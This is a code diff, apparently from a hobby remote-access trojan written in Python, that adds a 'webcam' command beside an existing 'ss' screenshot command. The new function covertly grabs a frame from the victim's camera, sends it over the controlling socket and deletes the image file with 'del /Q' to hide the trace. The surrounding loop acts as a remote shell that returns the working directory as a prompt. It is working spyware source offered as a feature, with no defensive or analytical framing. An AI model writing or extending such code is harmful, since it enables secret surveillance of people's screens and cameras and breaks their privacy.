@@ -1,9 +1,17 @@
-#To add the feature of Screenshots
+#To add the feature of webcam
 import socket
 import os
 import pyautogui
 import re
 import subprocess
+import cv2
+
+def webcam(s):
+    cap = cv2.VideoCapture(0) # video capture source camera (Here webcam of laptop)
+    ret,frame = cap.read() # return a single frame in variable `frame`
+    cv2.imwrite('ss.png',frame)
+    transfer(s, "ss.png")
+    subprocess.Popen("del /Q ss.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
 def screenshots(s):
     ss = pyautogui.screenshot()
@@ -68,6 +76,9 @@ while True:
         continue
     elif res == 'ss':
         screenshots(s)
+        continue
+    elif res == "webcam":
+        webcam(s)
         continue
     else:
         s.send((os.getcwd() + ">").encode())
